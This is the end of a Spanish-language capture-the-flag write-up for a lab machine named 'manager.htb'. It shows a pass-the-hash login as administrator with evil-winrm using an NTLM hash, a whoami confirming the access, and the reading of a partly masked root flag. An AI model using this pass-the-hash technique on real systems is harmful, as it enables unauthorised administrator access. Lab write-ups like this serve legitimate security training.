└─$ evil-winrm -i manager.htb -u administrator -H 'ae5064c2f62317332c88629e025924ef'

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
manager\administrator
```

Y obtenemos la flag de root.

```bash
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
fa673b72d8141448*****
```

***PWNED***

![](assets/Pasted%20image%2020260126004627.png)